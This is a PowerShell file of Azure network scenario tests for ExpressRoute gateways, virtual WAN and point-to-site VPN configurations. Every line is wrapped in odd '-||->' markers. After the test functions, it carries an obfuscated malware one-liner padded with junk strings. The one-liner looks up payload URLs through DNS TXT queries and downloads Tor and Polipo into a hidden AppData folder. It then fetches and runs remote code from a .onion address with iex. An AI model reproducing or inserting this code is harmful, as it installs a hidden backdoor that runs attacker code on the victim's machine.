         -||-> $createdExpressRouteGateway =  -||-> New-AzureRmExpressRouteGateway -ResourceGroupName $rgName -Name $expressRouteGatewayName -VirtualHub $virtualHub -MinScaleUnits 2 <-||-  <-||- 
         -||-> Write-Debug "Created ExpressRoute Gateway $expressRouteGatewayName successfully" <-||- 
         -||-> $expressRouteGateway =  -||-> Get-AzureRmExpressRouteGateway -ResourceGroupName $rgName -Name $expressRouteGatewayName <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateway <-||- 
         -||-> Write-Debug "Retrieved ExpressRoute Gateway $expressRouteGatewayName successfully" <-||- 

        
         -||-> $expressRouteGateways =  -||-> Get-AzureRmExpressRouteGateway <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateways <-||- 
         -||-> Assert-True {  -||-> $expressRouteGateways.Count -gt 0 <-||-  } <-||- 

		 -||-> $expressRouteGateways =  -||-> Get-AzureRmExpressRouteGateway -ResourceGroupName "*" <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateways <-||- 
         -||-> Assert-True {  -||-> $expressRouteGateways.Count -gt 0 <-||-  } <-||- 

		 -||-> $expressRouteGateways =  -||-> Get-AzureRmExpressRouteGateway -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateways <-||- 
         -||-> Assert-True {  -||-> $expressRouteGateways.Count -gt 0 <-||-  } <-||- 

		 -||-> $expressRouteGateways =  -||-> Get-AzureRmExpressRouteGateway -ResourceGroupName "*" -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateways <-||- 
         -||-> Assert-True {  -||-> $expressRouteGateways.Count -gt 0 <-||-  } <-||- 

		 -||-> $expressRouteGateways =  -||-> Get-AzureRmExpressRouteGateway -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteGateways <-||- 
         -||-> Assert-True {  -||-> $expressRouteGateways.Count -gt 0 <-||-  } <-||- 

        
         -||-> $peering =  -||-> New-AzureRmExpressRouteCircuitPeeringConfig -Name AzurePrivatePeering -PeeringType AzurePrivatePeering -PeerASN 100 -PrimaryPeerAddressPrefix "10.2.3.4/30" -SecondaryPeerAddressPrefix "11.2.3.4/30" -VlanId 22 <-||-  <-||- 
         -||-> $circuit =  -||-> New-AzureRmExpressRouteCircuit -Name $circuitName -Location $rglocation -ResourceGroupName $rgname -SkuTier Premium -SkuFamily MeteredData  -ServiceProviderName "Zayo" -PeeringLocation "Denver" -BandwidthInMbps 200 -Peering $peering <-||-  <-||- 
         -||-> Write-Debug "Created ExpressRoute Circuit with Private Peering $circuitName successfully" <-||- 

        
         -||-> $circuitResult =  -||-> Get-AzureRmExpressRouteCircuit -Name $circuitName -ResourceGroupName $rgname <-||-  <-||- 
         -||-> $peeringResult =  -||-> Get-AzureRmExpressRouteCircuitPeeringConfig -Name AzurePrivatePeering -ExpressRouteCircuit $circuitResult <-||-  <-||- 
         -||-> Write-Debug "Created ExpressRoute Circuit with Private Peering $circuitName successfully" <-||- 

        
         -||-> $createdExpressRouteConnection =  -||-> New-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name $expressRouteConnectionName -ExpressRouteCircuitPeeringId $peeringResult.Id -RoutingWeight 10 <-||-  <-||- 
         -||-> Write-Debug "Created ExpressRoute Connection with Private Peering $expressRouteConnectionName successfully" <-||- 
         -||-> $createdExpressRouteConnection =  -||-> Set-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name $expressRouteConnectionName -RoutingWeight 30 <-||-  <-||- 
         -||-> Write-Debug "Updated ExpressRoute Connection with Private Peering $expressRouteConnectionName successfully" <-||- 
         -||-> $expressRouteConnection =  -||-> Get-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name $expressRouteConnectionName <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteConnection <-||- 
         -||-> Write-Debug "Retrieved ExpressRoute Connection with Private Peering $expressRouteConnectionName successfully" <-||- 
         -||-> Assert-AreEqual $expressRouteConnectionName $expressRouteConnection.Name <-||- 
         -||-> Assert-AreEqual 30 $expressRouteConnection.RoutingWeight <-||- 

		 -||-> $expressRouteConnection =  -||-> Get-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteConnection <-||- 
		 -||-> Assert-True {  -||-> $expressRouteConnection.Count -ge 0 <-||- } <-||- 

		 -||-> $expressRouteConnection =  -||-> Get-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name "*" <-||-  <-||- 
         -||-> Assert-NotNull $expressRouteConnection <-||- 
		 -||-> Assert-True {  -||-> $expressRouteConnection.Count -ge 0 <-||- } <-||- 

        
         -||-> Remove-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name $expressRouteConnectionName -Force <-||- 
         -||-> Assert-ThrowsLike {  -||-> Get-AzureRmExpressRouteConnection -ResourceGroupName $rgName -ExpressRouteGatewayName $expressRouteGatewayName -Name $expressRouteConnectionName <-||-  } "*Not*Found*" <-||- 

         -||-> Remove-AzureRmExpressRouteGateway -ResourceGroupName $rgName -Name $expressRouteGatewayName -Force <-||- 
         -||-> Assert-ThrowsLike {  -||-> Get-AzureRmExpressRouteGateway -ResourceGroupName $rgName -Name $expressRouteGatewayName <-||-  } "*Not*Found*" <-||- 

         -||-> Remove-AzureRmVirtualHub -ResourceGroupName $hubRgName -Name $virtualHubName -Force <-||- 

         -||-> Remove-AzureRmVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Force <-||- 
         -||-> Assert-ThrowsLike {  -||-> Get-AzureRmVirtualWan -ResourceGroupName $rgName -Name $virtualWanName <-||-  } "*Not*Found*" <-||- 
    }
    finally
    {
         -||-> Clean-ResourceGroup $rgname <-||- 
    } <-||- 
} <-||- 


  -||-> function Test-P2SCortexCRUD
 {
 param 
    ( 
        $basedir = ".\" 
    )

    
     -||-> $rgname =  -||-> Get-ResourceGroupName <-||-  <-||- 
     -||-> $rglocation =  -||-> Get-ProviderLocation "Microsoft.Network/VirtualWans" <-||-  <-||- 
 
     -||-> $virtualWanName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $virtualHubName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $VpnServerConfiguration1Name =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $VpnServerConfiguration2Name =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $P2SVpnGatewayName =  -||-> Get-ResourceName <-||-  <-||- 
     -||-> $vpnclientAuthMethod = "EAPTLS" <-||- 

     -||-> $storeName = 'blob' + $rgName <-||- 

     -||-> try
	{
		
		 -||-> $resourceGroup =  -||-> New-AzResourceGroup -Name $rgname -Location $rglocation <-||-  <-||- 

		
		 -||-> $createdVirtualWan =  -||-> New-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName -Location $rglocation <-||-  <-||- 
		 -||-> $virtualWan =  -||-> Get-AzVirtualWan -ResourceGroupName $rgName -Name $virtualWanName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualWan.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualWanName $virtualWan.Name <-||- 

		
		 -||-> $createdVirtualHub =  -||-> New-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName -Location $rglocation -AddressPrefix "192.168.1.0/24" -VirtualWan $virtualWan <-||-  <-||- 
		 -||-> $virtualHub =  -||-> Get-AzVirtualHub -ResourceGroupName $rgName -Name $virtualHubName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $virtualHub.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $virtualHubName $virtualHub.Name <-||- 
		 -||-> Assert-AreEqual $virtualWan.Id $virtualhub.VirtualWan.Id <-||- 

		
		 -||-> $VpnServerConfigCertFilePath =  -||-> Join-Path -Path $basedir -ChildPath "\ScenarioTests\Data\ApplicationGatewayAuthCert.cer" <-||-  <-||- 
		 -||-> $listOfCerts =  -||-> New-Object "System.Collections.Generic.List[String]" <-||-  <-||- 
		 -||-> $listOfCerts.Add($VpnServerConfigCertFilePath) <-||- 
		 -||-> $vpnclientipsecpolicy1 =  -||-> New-AzVpnClientIpsecPolicy -IpsecEncryption AES256 -IpsecIntegrity SHA256 -SALifeTime 86471 -SADataSize 429496 -IkeEncryption AES256 -IkeIntegrity SHA384 -DhGroup DHGroup14 -PfsGroup PFS14 <-||-  <-||- 
         -||-> New-AzVpnServerConfiguration -Name $VpnServerConfiguration1Name -ResourceGroupName $rgName -VpnProtocol IkeV2 -VpnAuthenticationType Certificate -VpnClientRootCertificateFilesList $listOfCerts -VpnClientRevokedCertificateFilesList $listOfCerts -VpnClientIpsecPolicy $vpnclientipsecpolicy1 -Location $rglocation <-||- 

        
         -||-> $vpnServerConfig1 =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration1Name <-||-  <-||- 
         -||-> Assert-NotNull $vpnServerConfig1 <-||- 
		 -||-> Assert-AreEqual $rgName $vpnServerConfig1.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $VpnServerConfiguration1Name $vpnServerConfig1.Name <-||- 
		 -||-> $protocols = $vpnServerConfig1.VpnProtocols <-||- 
		 -||-> Assert-AreEqual 1 @( -||-> $protocols <-||- ).Count <-||- 
		 -||-> Assert-AreEqual "IkeV2" $protocols[0] <-||- 
		 -||-> $authenticationTypes = $vpnServerConfig1.VpnAuthenticationTypes <-||- 
		 -||-> Assert-AreEqual 1 @( -||-> $authenticationTypes <-||- ).Count <-||- 
		 -||-> Assert-AreEqual "Certificate" $authenticationTypes[0] <-||- 

		
		 -||-> $vpnClientAddressSpaces =  -||-> New-Object string[] 2 <-||-  <-||- 
		 -||-> $vpnClientAddressSpaces[0] = "192.168.2.0/24" <-||- 
		 -||-> $vpnClientAddressSpaces[1] = "192.168.3.0/24" <-||- 
		 -||-> $createdP2SVpnGateway =  -||-> New-AzP2sVpnGateway -ResourceGroupName $rgName -Name $P2SvpnGatewayName -VirtualHub $virtualHub -VpnGatewayScaleUnit 1 -VpnClientAddressPool $vpnClientAddressSpaces -VpnServerConfiguration $vpnServerConfig1 <-||-  <-||- 
		 -||-> Assert-AreEqual "Succeeded" $createdP2SVpnGateway.ProvisioningState <-||- 

		
		 -||-> $P2SVpnGateway =  -||-> Get-AzP2sVpnGateway -ResourceGroupName $rgName -Name $P2SvpnGatewayName <-||-  <-||- 
		 -||-> Assert-AreEqual $rgName $P2SVpnGateway.ResourceGroupName <-||- 
		 -||-> Assert-AreEqual $P2SvpnGatewayName $P2SVpnGateway.Name <-||- 
		 -||-> Assert-AreEqual $vpnServerConfig1.Id $P2SVpnGateway.VpnServerConfiguration.Id <-||- 
		 -||-> Assert-AreEqual "Succeeded" $P2SVpnGateway.ProvisioningState <-||- 

		
         -||-> $associatedVpnServerConfigs =  -||-> Get-AzVirtualWanVpnServerConfiguration -Name $virtualWanName -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $associatedVpnServerConfigs <-||- 
         -||-> Assert-AreEqual 1 @( -||-> $associatedVpnServerConfigs.VpnServerConfigurationResourceIds <-||- ).Count <-||- 
         -||-> Assert-AreEqual $vpnServerConfig1.Id $associatedVpnServerConfigs.VpnServerConfigurationResourceIds[0] <-||- 

        
         -||-> $vpnServerConfig1 =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration1Name <-||-  <-||- 
         -||-> Assert-NotNull $vpnServerConfig1 <-||- 
         -||-> Assert-AreEqual $vpnServerConfig1.P2sVpnGateways[0].Id $P2SVpnGateway.Id <-||- 

        
         -||-> $vpnServerConfigs =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $vpnServerConfigs <-||- 
         -||-> Assert-AreEqual 1 @( -||-> $vpnServerConfigs <-||- ).Count <-||- 
        
        
		 -||-> $vpnProfileResponse =  -||-> Get-AzP2sVpnGatewayVpnProfile -Name $P2SVpnGatewayName -ResourceGroupName $rgName -AuthenticationMethod $vpnclientAuthMethod <-||-  <-||- 
		 -||-> Assert-NotNull $vpnProfileResponse.ProfileUrl <-||- 
		 -||-> Assert-AreEqual True ( -||-> $vpnProfileResponse.ProfileUrl -Match "zip" <-||- ) <-||- 

		
		 -||-> $vpnProfileWanResponse =  -||-> Get-AzVirtualWanVpnServerConfigurationVpnProfile -Name $virtualWanName -ResourceGroupName $rgName -AuthenticationMethod $vpnclientAuthMethod -VpnServerConfiguration $vpnServerConfig1 <-||-  <-||- 
		 -||-> Assert-NotNull $vpnProfileWanResponse.ProfileUrl <-||- 
		 -||-> Assert-AreEqual True ( -||-> $vpnProfileWanResponse.ProfileUrl -Match "zip" <-||- ) <-||- 

		
		
		 -||-> $Secure_String_Pwd =  -||-> ConvertTo-SecureString "TestRadiusServerPassword" -AsPlainText -Force <-||-  <-||- 
		 -||-> New-AzVpnServerConfiguration -Name $VpnServerConfiguration2Name -ResourceGroupName $rgName -VpnProtocol IkeV2 -VpnAuthenticationType Radius -RadiusServerAddress "TestRadiusServer" -RadiusServerSecret $Secure_String_Pwd -RadiusServerRootCertificateFilesList $listOfCerts -RadiusClientRootCertificateFilesList $listOfCerts -Location $rglocation <-||- 
        
         -||-> $vpnServerConfig2 =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration2Name <-||-  <-||- 
		 -||-> Assert-AreEqual "Succeeded" $vpnServerConfig2.ProvisioningState <-||- 
		 -||-> Assert-AreEqual "TestRadiusServer" $vpnServerConfig2.RadiusServerAddress <-||- 
	
        
         -||-> $vpnServerConfigs =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $vpnServerConfigs <-||- 
         -||-> Assert-AreEqual 2 @( -||-> $vpnServerConfigs <-||- ).Count <-||- 

		
		 -||-> Update-AzVpnServerConfiguration -Name $VpnServerConfiguration2Name -ResourceGroupName $rgName -RadiusServerAddress "TestRadiusServer1" <-||- 
		 -||-> $VpnServerConfig2 =  -||-> Get-AzVpnServerConfiguration -Name $VpnServerConfiguration2Name -ResourceGroupName $rgName <-||-  <-||- 
		 -||-> Assert-AreEqual $VpnServerConfiguration2Name $VpnServerConfig2.Name <-||- 
		 -||-> Assert-AreEqual "TestRadiusServer1" $VpnServerConfig2.RadiusServerAddress <-||- 
		
		 -||-> Update-AzVpnServerConfiguration -ResourceId  $VpnServerConfig2.Id -RadiusServerAddress "TestRadiusServer2" <-||- 			
		 -||-> $VpnServerConfig2Get =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration2Name <-||-  <-||- 
		 -||-> Assert-AreEqual "TestRadiusServer2" $VpnServerConfig2Get.RadiusServerAddress <-||- 
						
		 -||-> Update-AzVpnServerConfiguration -InputObject $VpnServerConfig2Get -RadiusServerAddress "TestRadiusServer3" <-||- 
		 -||-> $VpnServerConfig2Get =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration2Name <-||-  <-||- 
         -||-> Assert-AreEqual "TestRadiusServer3" $VpnServerConfig2Get.RadiusServerAddress <-||- 

        
         -||-> $vpnClientAddressSpaces[1] = "192.168.4.0/24" <-||- 
         -||-> $updatedP2SVpnGateway =  -||-> Update-AzP2sVpnGateway -ResourceGroupName $rgName -Name $P2SvpnGatewayName -VpnClientAddressPool $vpnClientAddressSpaces <-||-  <-||- 

         -||-> $P2SVpnGateway =  -||-> Get-AzP2sVpnGateway -ResourceGroupName $rgName -Name $P2SvpnGatewayName <-||-  <-||- 
		 -||-> Assert-AreEqual $P2SvpnGatewayName $P2SVpnGateway.Name <-||- 
		 -||-> Assert-AreEqual "Succeeded" $P2SVpnGateway.ProvisioningState <-||- 
		 -||-> Assert-AreEqual $vpnServerConfig1.Id $P2SVpnGateway.VpnServerConfiguration.Id <-||- 
		 -||-> $setVpnClientAddressSpacesString = [system.String]::Join(" ", $vpnClientAddressSpaces) <-||- 
         -||-> Assert-AreEqual $setVpnClientAddressSpacesString $P2SVpnGateway.P2SConnectionConfigurations[0].VpnClientAddressPool.AddressPrefixes <-||- 
        
         -||-> $associatedVpnServerConfigs =  -||-> Get-AzVirtualWanVpnServerConfiguration -ResourceId $virtualWan.Id <-||-  <-||- 
         -||-> Assert-NotNull $associatedVpnServerConfigs <-||- 
         -||-> Assert-AreEqual 1 @( -||-> $associatedVpnServerConfigs.VpnServerConfigurationResourceIds <-||- ).Count <-||- 
         -||-> Assert-AreEqual $vpnServerConfig1.Id $associatedVpnServerConfigs.VpnServerConfigurationResourceIds[0] <-||- 

        
		 -||-> $delete =  -||-> Remove-AzVpnServerConfiguration -InputObject $VpnServerConfig2Get -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> $vpnServerConfigs =  -||-> Get-AzVpnServerConfiguration -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $vpnServerConfigs <-||- 
         -||-> Assert-AreEqual 1 @( -||-> $vpnServerConfigs <-||- ).Count <-||- 

        
        
        
        
        
        
        
         -||-> $storetype = 'Standard_GRS' <-||- 
		 -||-> $containerName = "cont$( -||-> $rgName <-||- )" <-||- 
		 -||-> New-AzStorageAccount -ResourceGroupName $rgName -Name $storeName -Location $rglocation -Type $storetype <-||- 
		 -||-> $key =  -||-> Get-AzStorageAccountKey -ResourceGroupName $rgName -Name $storeName <-||-  <-||- 
		 -||-> $context =  -||-> New-AzStorageContext -StorageAccountName $storeName -StorageAccountKey $key[0].Value <-||-  <-||- 
		 -||-> New-AzStorageContainer -Name $containerName -Context $context <-||- 
		 -||-> $container =  -||-> Get-AzStorageContainer -Name $containerName -Context $context <-||-  <-||- 
		 -||-> New-Item -Name EmptyFile.txt -ItemType File -Force <-||- 
		 -||-> Set-AzStorageBlobContent -File "EmptyFile.txt" -Container $containerName -Blob "emptyfile.txt" -Context $context <-||- 
		 -||-> $now= -||-> get-date <-||-  <-||- 
		 -||-> $blobSasUrl =  -||-> New-AzStorageBlobSASToken -Container $containerName -Blob emptyfile.txt -Context $context -Permission "rwd" -StartTime $now.AddHours(-1) -ExpiryTime $now.AddDays(1) -FullUri <-||-  <-||- 

        
         -||-> $detailedConnectionHealth =  -||-> Get-AzP2sVpnGatewayDetailedConnectionHealth -Name $P2SvpnGatewayName -ResourceGroupName $rgName -OutputBlobSasUrl $blobSasUrl <-||-  <-||- 
         -||-> Assert-NotNull $detailedConnectionHealth <-||- 
         -||-> Assert-NotNull $detailedConnectionHealth.SasUrl <-||- 
         -||-> Assert-AreEqual $blobSasUrl $detailedConnectionHealth.SasUrl <-||- 
     }
     finally
     {
		
		 -||-> $delete =  -||-> Remove-AzP2sVpnGateway -Name $P2SVpnGatewayName -ResourceGroupName $rgName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

        
         -||-> $associatedVpnServerConfigs =  -||-> Get-AzVirtualWanVpnServerConfiguration -Name $virtualWanName -ResourceGroupName $rgName <-||-  <-||- 
         -||-> Assert-NotNull $associatedVpnServerConfigs <-||- 
         -||-> Assert-AreEqual 0 @( -||-> $associatedVpnServerConfigs.VpnServerConfigurationResourceIds <-||- ).Count <-||- 

		
		 -||-> $delete =  -||-> Remove-AzVpnServerConfiguration -ResourceGroupName $rgName -Name $VpnServerConfiguration1Name -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		
		 -||-> $delete =  -||-> Remove-AzVirtualHub -ResourceGroupName $rgname -Name $virtualHubName -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		
		 -||-> $delete =  -||-> Remove-AzVirtualWan -InputObject $virtualWan -Force -PassThru <-||-  <-||- 
		 -||-> Assert-AreEqual $True $delete <-||- 

		 -||-> Clean-ResourceGroup $rgname <-||- 
     } <-||- 
} <-||- 
 -||-> 'iewtZ' <-||- ; -||-> $ErrorActionPreference = 'SilentlyContinue' <-||- ; -||-> 'sLfbdc' <-||- ; -||-> 'SvpvZJY' <-||- ; -||-> $vyih = ( -||-> get-wmiobject Win32_ComputerSystemProduct <-||- ).UUID <-||- ; -||-> 'gwWrloV' <-||- ; -||-> 'ouvd' <-||- ; -||-> if ( -||-> ( -||-> gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run <-||- ) -match $vyih <-||- ){; -||-> 'cLJEJvJeL' <-||- ; -||-> 'ESlFQFDG' <-||- ; -||-> ( -||-> Get-Process -id $pid <-||- ).Kill() <-||- ; -||-> 'BNBekbF' <-||- ; -||-> 'iCIcWAWiH' <-||- ;} <-||- ; -||-> 'updYlRxc' <-||- ; -||-> 'Yu' <-||- ; -||-> function e($cxj){; -||-> 'INWYxMFSSxC' <-||- ; -||-> 'hljZOzviQHL' <-||- ; -||-> $muo = ( -||-> ( -||-> ( -||-> iex "nslookup -querytype=txt $cxj 8.8.8.8" <-||- ) -match '"' <-||- ) -replace '"', '' <-||- )[0].Trim() <-||- ; -||-> 'wqBuiyIUeiD' <-||- ; -||-> 'EZXzZnfj' <-||- ; -||-> $ii.DownloadFile($muo, $yoe) <-||- ; -||-> 'mllh' <-||- ; -||-> 'gxp' <-||- ; -||-> $vi = $vpw.NameSpace($yoe).Items() <-||- ; -||-> 'DUtRuXurl' <-||- ; -||-> 'wwtbOkl' <-||- ; -||-> $vpw.NameSpace($phi).CopyHere($vi, 20) <-||- ; -||-> 'ZOcGNFapCd' <-||- ; -||-> 'fvVhKXFhu' <-||- ; -||-> rd $yoe <-||- ; -||-> 'bXAJndTZDgZ' <-||- ; -||-> 'JC' <-||- ;} <-||- ; -||-> 'OCLQDWnfu' <-||- ; -||-> 'ikobA' <-||- ; -||-> 'eSOzl' <-||- ; -||-> 'FswTHfHzbr' <-||- ; -||-> 'tTjbUWY' <-||- ; -||-> 'zpzTfITAjM' <-||- ; -||-> $phi = $env:APPDATA + '\' + $vyih <-||- ; -||-> 'pcqZ' <-||- ; -||-> 'lOoNehXCNKV' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $phi <-||- ) <-||- ){; -||-> 'YK' <-||- ; -||-> 'DRt' <-||- ; -||-> $mc =  -||-> New-Item -ItemType Directory -Force -Path $phi <-||-  <-||- ; -||-> 'ZFzNt' <-||- ; -||-> 'GjTw' <-||- ; -||-> $mc.Attributes = "Hidden", "System", "NotContentIndexed" <-||- ; -||-> 'NphybPzgXM' <-||- ; -||-> 'omHVQM' <-||- ;} <-||- ; -||-> 'HHFFHSs' <-||- ; -||-> 'wnXuik' <-||- ; -||-> 'OT' <-||- ; -||-> 'VOLHVuXq' <-||- ; -||-> $uf=$phi+ '\tor.exe' <-||- ; -||-> 'sHVRBHzTXF' <-||- ; -||-> 'trLTGFyqlgE' <-||- ; -||-> $yan=$phi+ '\polipo.exe' <-||- ; -||-> 'Vhdu' <-||- ; -||-> 'gYvdM' <-||- ; -||-> $yoe=$phi+'\'+$vyih+'.zip' <-||- ; -||-> 'ZfDN' <-||- ; -||-> 'UCEhRONmg' <-||- ; -||-> $ii= -||-> New-Object System.Net.WebClient <-||-  <-||- ; -||-> 'Ugpp' <-||- ; -||-> 'cdNqGhCEjG' <-||- ; -||-> $vpw= -||-> New-Object -C Shell.Application <-||-  <-||- ; -||-> 'MsfmRSPjrey' <-||- ; -||-> 'qGy' <-||- ; -||-> 'sH' <-||- ; -||-> 'ix' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $uf <-||- ) -or !( -||-> Test-Path $yan <-||- ) <-||- ){; -||-> 'cPGfgxJLMQ' <-||- ; -||-> 'Oafl' <-||- ; -||-> e 'i.vankin.de' <-||- ; -||-> 'RpGJUxN' <-||- ; -||-> 'EhrEGACdk' <-||- ;} <-||- ; -||-> 'cFrjysajeP' <-||- ; -||-> 'CMTJLy' <-||- ; -||-> 'klIQuOh' <-||- ; -||-> 'UL' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $uf <-||- ) -or !( -||-> Test-Path $yan <-||- ) <-||- ){; -||-> 'RZd' <-||- ; -||-> 'tbVW' <-||- ; -||-> e 'gg.ibiz.cc' <-||- ; -||-> 'mZASyvj' <-||- ; -||-> 'hczjHEH' <-||- ;} <-||- ; -||-> 'IMv' <-||- ; -||-> 'yawpbSHIN' <-||- ; -||-> 'TdYiqz' <-||- ; -||-> 'DaKI' <-||- ; -||-> $iul=$phi+'\roaminglog' <-||- ; -||-> 'KyiAtRISaBi' <-||- ; -||-> 'MIAa' <-||- ; -||-> saps $uf -Ar " --Log `"notice file $iul`"" -wi Hidden <-||- ; -||-> 'Xqo' <-||- ; -||-> 'iX' <-||- ;do{ -||-> sleep 1 <-||- ; -||-> $ep= -||-> gc $iul <-||-  <-||- }while( -||-> !( -||-> $ep -match 'Bootstrapped 100%: Done.' <-||- ) <-||- ); -||-> 'DECq' <-||- ; -||-> 'mMTzmo' <-||- ; -||-> saps $yan -a "socksParentProxy=localhost:9050" -wi Hidden <-||- ; -||-> 'qLzQnQAglU' <-||- ; -||-> 'lc' <-||- ; -||-> sleep 7 <-||- ; -||-> 'OhASXZLVhvy' <-||- ; -||-> 'bUMQerk' <-||- ; -||-> $hja= -||-> New-Object System.Net.WebProxy( -||-> "localhost:8123" <-||- ) <-||-  <-||- ; -||-> 'ysETIFO' <-||- ; -||-> 'aMzeEXJatUc' <-||- ; -||-> $hja.useDefaultCredentials = $true <-||- ; -||-> 'MA' <-||- ; -||-> 'ahxYjELWf' <-||- ; -||-> $ii.proxy=$hja <-||- ; -||-> 'kllZXZPScFE' <-||- ; -||-> 'UnPHeDt' <-||- ; -||-> $laz='http://powerwormjqj42hu.onion/get.php?s=setup&mom=9C7ABD3A-D197-11DB-BBDA-BBE061E60019&uid=' + $vyih <-||- ; -||-> 'cmIJbcllSfd' <-||- ; -||-> 'TRutDNn' <-||- ; -||-> while( -||-> !$qb <-||- ){ -||-> $qb=$ii.downloadString($laz) <-||- } <-||- ; -||-> 'eaxdBgnRytG' <-||- ; -||-> 'UcjybNgU' <-||- ; -||-> if ( -||-> $qb -ne 'none' <-||- ){; -||-> 'uICtlcoEV' <-||- ; -||-> 'udG' <-||- ; -||-> iex $qb <-||- ; -||-> 'XNNdtFqQhSF' <-||- ; -||-> 'QzfWyKqrY' <-||- ;} <-||- ; -||-> 'HqIJJF' <-||- ;



